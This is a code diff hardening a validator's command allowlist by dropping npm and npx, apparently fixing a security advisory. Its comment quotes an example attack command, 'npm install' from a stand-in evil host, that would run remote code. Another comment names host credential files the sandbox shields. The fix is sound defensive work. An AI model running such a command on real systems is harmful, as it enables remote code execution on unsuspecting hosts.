@@ -32,7 +32,16 @@ const MAX_OUTPUT_CHARS = 4000;
 // Any command whose first token is not in this set is rejected before spawn().
 // This prevents command injection via Hub-delivered task.command strings even
 // if Hub itself is compromised or mis-signs a task.
-const ALLOWED_EXECUTABLES = new Set(['node', 'npm', 'npx']);
+//
+// GHSA-jxh8-jh77-xh6g: `npm` and `npx` used to be on this allowlist. They are
+// arbitrary-code-execution-by-design (npm runs preinstall/install/postinstall
+// lifecycle scripts; npx fetches and runs remote package `bin` entries), so a
+// compromised/MitM'd Hub could issue `validation_commands: ["npm install
+// https://evil/evil.tgz"]` and get RCE on every validator in one poll cycle.
+// Validator nodes only ever need to run `node <script>`, so we drop npm/npx.
+// Any legitimate validation that previously used `npx vitest run ...` must be
+// rewritten by the gene author to `node node_modules/vitest/vitest.mjs ...`.
+const ALLOWED_EXECUTABLES = new Set(['node']);
 
 // Depth-in-depth: even though `node` is in ALLOWED_EXECUTABLES, reject the
 // flags that turn it into an arbitrary-code evaluator. A legitimate Hub-
@@ -149,7 +158,7 @@ function buildSandboxEnv() {
   // os.tmpdir() path so that any child process that tries to read ~/.npmrc,
   // ~/.ssh/*, ~/.aws/credentials, or similar host-credential files ends up
   // in an empty scratch directory instead of the real user home.
-  // PATH is preserved so that node/npm/npx remain resolvable -- the
+  // PATH is preserved so that node remains resolvable -- the
   // ALLOWED_EXECUTABLES allowlist is the real gate against unwanted tools.
   const tmp = os.tmpdir();
   const fallbackPath = process.platform === 'win32'
